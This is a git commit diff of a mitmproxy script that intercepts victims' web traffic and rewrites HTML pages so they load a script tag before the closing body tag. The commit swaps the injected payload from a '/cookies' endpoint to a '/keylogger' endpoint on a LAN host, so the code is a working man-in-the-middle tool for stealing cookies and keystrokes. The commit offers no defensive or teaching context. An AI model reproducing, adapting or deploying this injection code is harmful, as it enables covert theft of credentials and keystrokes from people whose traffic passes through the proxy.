63f6a4d245c920ca257028358aca920d98abc74a
juanga333 <juangaruiz19@gmail.com>
2021-06-08 13:24:39 +0200

    stable version

--- injection/injecthtml.py
+++ injection/injecthtml.py
@@ -4,18 +4,19 @@ from mitmproxy import http
 import requests
 
 def request(flow):
-	if flow.request.pretty_url.endswith(""):
+	if not flow.request.pretty_url.endswith(".js") and not flow.request.pretty_url.endswith(".css"):
 		url = requests.get(flow.request.pretty_url)
+		print(url)
 		htmltext = url.text
 		htmltextr = htmltext.replace("</body>", js + "</body>")
 
 		flow.response = http.HTTPResponse.make(
 			200,
 			htmltextr,
-			{"content-type":"text/html"},
+			{"content-type": "text/html"},
 		)
 
 
 #inject your html code here
-js = '<script type="text/javascript" src="http://192.168.0.172:8085/cookies"></script>'
+js = '<script type="text/javascript" src="http://192.168.0.172:8085/keylogger"></script>'
 
